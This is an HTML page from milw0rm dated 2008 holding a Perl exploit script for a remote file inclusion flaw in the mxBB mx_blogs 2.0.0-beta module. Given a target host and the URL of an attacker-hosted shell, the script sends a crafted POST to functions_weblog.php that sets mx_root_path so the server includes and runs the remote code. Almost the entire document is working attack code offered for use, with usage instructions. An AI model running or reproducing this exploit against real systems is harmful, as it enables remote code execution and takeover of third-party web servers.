<html><head><title>mxBB Module mx_blogs 2.0.0-beta Remote File Inclusion Exploit</title></head><pre># mxBB Module mx_blogs 2.0.0-beta Remote File Include Exploit
#
# Vendor: http://www.mx-system.com
#
# Download: http://www.mx-system.com/index.php?page=4&amp;action=file&amp;file_id=405
#
# Vulncode in: /includes/functions_weblog.php line 24
#
# Greetz: str0ke, TheJT, rgod, Vallani, DNX, NBBN

use Getopt::Long;
use URI::Escape;
use IO::Socket;

$shellcode = &quot;Insert the url to shell here&quot;;

main();

sub usage
{
print &quot;\mxBB Module mx_blogs 2.0.0-beta Remote File Include Expl\n&quot;;
print &quot;by bd0rk &lt;www.soh-crew.it.tt&gt;\n&quot;;
print &quot;-t, --ttarget\t(someone.com)\n&quot;;
print &quot;-f, --tshell\t(url to your shellcode)\n&quot;;
print &quot;-d, --dir\t(/mx_blogs)\n&quot;;
exit;
}

sub main
{
GetOptions ('t|target=s' =&gt; \$target,'f|shell=s' =&gt; \$shell,'d|dir=s' =&gt; \$dir);
usage() unless $target;
$shellcode = $shell unless !$shell;
$url = uri_escape($shellcode);

$sock = IO::Socket::INET-&gt;new(Proto=&gt;&quot;tcp&quot;,PeerAddr=&gt;&quot;$target&quot;,PeerPort=&gt;&quot;80&quot;) or die &quot;\nConnection() failed.\n&quot;;

print &quot;\nConnected to &quot;.$target.&quot;, injecting shellcode.\n&quot;;
$sendurl = &quot;mx_root_path=&quot;.$url.&quot;&quot;;
$sendlen = length($sendurl);
print $sock &quot;POST &quot;.$dir.&quot;/includes/functions_weblog.php? HTTP/1.1\n&quot;;
print $sock &quot;Host: &quot;.$target.&quot;\n&quot;;
print $sock &quot;Connection: close\n&quot;;
print $sock &quot;Content-Type: application/x-www-form-urlencoded\n&quot;;
print $sock &quot;Content-Length: &quot;.$sendlen.&quot;\n\n&quot;;
print $sock $sendurl;
print &quot;Attempted to include shellcode, Response:\n\n&quot;;
while($recvd = &lt;$sock&gt;)
{
print &quot; &quot;.$recvd.&quot;&quot;;
}
exit;
}

# milw0rm.com [2008-03-30]</pre></html>